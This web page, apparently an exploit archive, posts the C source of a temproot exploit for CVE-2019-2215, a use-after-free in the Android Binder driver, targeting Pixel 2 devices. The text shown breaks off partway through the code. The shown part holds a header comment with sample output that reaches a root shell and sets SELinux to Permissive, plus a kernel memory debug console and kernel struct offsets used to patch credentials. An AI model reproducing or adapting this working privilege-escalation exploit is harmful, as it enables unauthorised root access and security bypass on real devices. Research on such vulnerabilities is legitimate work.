<h2 id="CVE-2019-2215-Binder-UAF"><a href="#CVE-2019-2215-Binder-UAF" class="headerlink" title="CVE-2019-2215 - Binder UAF"></a>CVE-2019-2215 - Binder UAF</h2><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cve-2019-2215.c: Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Based on proof-of-concept by Jann Horn &amp; Maddie Stone of Google Project Zero.</span></span><br><span class="line"><span class="comment"> * cf. https://bugs.chromium.org/p/project-zero/issues/detail?id=1942</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Description: Demonstration of a kernel memory R/W-only privilege escalation</span></span><br><span class="line"><span class="comment"> *              attack resulting in a temporary root shell.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *              Works on Google Pixel 2/Pixel 2 XL (walleye/taimen) devices</span></span><br><span class="line"><span class="comment"> *              running the QP1A.190711.020 image with kernel version-BuildID</span></span><br><span class="line"><span class="comment"> *              4.4.177-g83bee1dc48e8. For this tool to work on other devices or</span></span><br><span class="line"><span class="comment"> *              kernels affected by the same vulnerability, some offsets need to</span></span><br><span class="line"><span class="comment"> *              be found and changed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *              Also includes a mini debug console from which it is possible to</span></span><br><span class="line"><span class="comment"> *              explore and modify kernel memory, as well as spawn a shell. Odd!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Usage: Compile for AArch64 and run; all the source is in a single file on</span></span><br><span class="line"><span class="comment"> *        purpose. Tested with the cross-compiler toolchain in Android NDK r20.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *        Pass &#x27;debug&#x27; as the sole cmdline argument to start the mini debug</span></span><br><span class="line"><span class="comment"> *        console instead of the privesc routine after kernel R/W is achieved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Sample output:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  taimen:/ $ cd /data/local/tmp</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp $ install -m 755 /sdcard/cve-2019-2215 ./</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp $ ./cve-2019-2215</span></span><br><span class="line"><span class="comment"> *  Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215</span></span><br><span class="line"><span class="comment"> *  [+] startup</span></span><br><span class="line"><span class="comment"> *  [+] find kernel address of current task_struct</span></span><br><span class="line"><span class="comment"> *  [+] obtain arbitrary kernel memory R/W</span></span><br><span class="line"><span class="comment"> *  [+] find kernel base address</span></span><br><span class="line"><span class="comment"> *  [+] bypass SELinux and patch current credentials</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp # id</span></span><br><span class="line"><span class="comment"> *  uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),</span></span><br><span class="line"><span class="comment"> *  1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),</span></span><br><span class="line"><span class="comment"> *  3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:kernel:s0</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp # getenforce</span></span><br><span class="line"><span class="comment"> *  Permissive</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp # exit</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  &lt;-- snip --&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp $ ./cve-2019-2215 debug</span></span><br><span class="line"><span class="comment"> *  Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215</span></span><br><span class="line"><span class="comment"> *  [+] startup</span></span><br><span class="line"><span class="comment"> *  [+] find kernel address of current task_struct</span></span><br><span class="line"><span class="comment"> *  [+] obtain arbitrary kernel memory R/W</span></span><br><span class="line"><span class="comment"> *  [+] find kernel base address</span></span><br><span class="line"><span class="comment"> *  launching debug console, enter &#x27;help&#x27; for quick help</span></span><br><span class="line"><span class="comment"> *  debug&gt; print</span></span><br><span class="line"><span class="comment"> *  ffffff9bad880000 kernel_base</span></span><br><span class="line"><span class="comment"> *  ffffff9baf8a57d0 init_task</span></span><br><span class="line"><span class="comment"> *  ffffff9baf8af2c8 init_user_ns</span></span><br><span class="line"><span class="comment"> *  ffffff9baf8e3780 selinux_enabled</span></span><br><span class="line"><span class="comment"> *  ffffff9bafc4e4a8 selinux_enforcing</span></span><br><span class="line"><span class="comment"> *  ffffffe6b2942b80 current</span></span><br><span class="line"><span class="comment"> *  debug&gt; write ffffff9bafc4e4a8 01 00 00 00</span></span><br><span class="line"><span class="comment"> *  debug&gt; exit</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp $ getenforce</span></span><br><span class="line"><span class="comment"> *  Enforcing</span></span><br><span class="line"><span class="comment"> *  taimen:/data/local/tmp $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint8_t</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="comment">// #include &lt;linux/android/binder.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINDER_THREAD_EXIT 0x40046208ul</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> we don&#x27;t cover the task_struct* here; we want to leave it uninitialized</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Data structure definitions as found in the Sep 2019 QP1A.190711.020 build of</span></span><br><span class="line"><span class="comment"> * Android 10 for walleye/taimen, kernel version-BuildID 4.4.177-g83bee1dc48e8.</span></span><br><span class="line"><span class="comment"> * Verified using `pahole` on a build of the official Android kernel/msm git:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-wahoo-4.4-android10</span></span><br><span class="line"><span class="comment"> *  (tree a4557a647a054b871bdf8e452a014cafa0ae5078)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We leave only the fields in which we&#x27;re interested, and we&#x27;re really only</span></span><br><span class="line"><span class="comment"> * interested in their offsets; the others_* fields are padding.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                            (&lt;original type&gt;           &lt;offset&gt; &lt;size&gt;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binder_thread</span> &#123;</span></span><br><span class="line">    u8 others_0[<span class="number">160</span>];</span><br><span class="line">    u8 wait[<span class="number">24</span>];           <span class="comment">/*  wait_queue_head_t           160     24  */</span></span><br><span class="line">    u8 others_1[<span class="number">216</span>];</span><br><span class="line">    <span class="comment">// u8 others_1[224];   /* <span class="doctag">NOTE:</span> see binder_iovecs below */</span></span><br><span class="line">&#125; __attribute__((packed)); <span class="comment">/* size: 408 in kernel, 400 here */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    u8 others_0[<span class="number">1312</span>];</span><br><span class="line">    u64 mm;                <span class="comment">/*  struct mm_struct *          1312    8   */</span></span><br><span class="line">    u8 others_1[<span class="number">608</span>];</span><br><span class="line">    u64 real_cred;         <span class="comment">/*  const struct cred *         1928    8   */</span></span><br><span class="line">    u64 cred;              <span class="comment">/*  const struct cred *         1936    8   */</span></span><br><span class="line">    u8 others_2[<span class="number">1736</span>];</span><br><span class="line">&#125; __attribute__((packed)); <span class="comment">/* size: 3680 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    u8 others_0[<span class="number">768</span>];</span><br><span class="line">    u64 user_ns;           <span class="comment">/*  struct user_namespace *     768     8   */</span></span><br><span class="line">    u8 others_1[<span class="number">48</span>];</span><br><span class="line">&#125; __attribute__((packed)); <span class="comment">/* size: 824 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    u8 others_0[<span class="number">4</span>];</span><br><span class="line">    u32 uid;               <span class="comment">/*  kuid_t                      4       4   */</span></span><br><span class="line">    u32 gid;               <span class="comment">/*  kgid_t                      8       4   */</span></span><br><span class="line">    u32 suid;              <span class="comment">/*  kuid_t                      12      4   */</span></span><br><span class="line">    u32 sgid;              <span class="comment">/*  kgid_t                      16      4   */</span></span><br><span class="line">    u32 euid;              <span class="comment">/*  kuid_t                      20      4   */</span></span><br><span class="line">    u32 egid;              <span class="comment">/*  kgid_t                      24      4   */</span></span><br><span class="line">    u32 fsuid;             <span class="comment">/*  kuid_t                      28      4   */</span></span><br><span class="line">    u32 fsgid;             <span class="comment">/*  kgid_t                      32      4   */</span></span><br><span class="line">    u32 securebits;        <span class="comment">/*  unsigned int                36      4   */</span></span><br><span class="line">    u64 cap_inheritable;   <span class="comment">/*  kernel_cap_t                40      8   */</span></span><br><span class="line">    u64 cap_permitted;     <span class="comment">/*  kernel_cap_t                48      8   */</span></span><br><span class="line">    u64 cap_effective;     <span class="comment">/*  kernel_cap_t                56      8   */</span></span><br><span class="line">    u64 cap_bset;          <span class="comment">/*  kernel_cap_t                64      8   */</span></span><br><span class="line">    u64 cap_ambient;       <span class="comment">/*  kernel_cap_t                72      8   */</span></span><br><span class="line">    u8 others_1[<span class="number">40</span>];</span><br><span class="line">    u64 security;          <span class="comment">/*  void *                      120     8   */</span></span><br><span class="line">    u8 others_2[<span class="number">40</span>];</span><br><span class="line">&#125; __attribute__((packed)); <span class="comment">/* size: 168 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_security_struct</span> 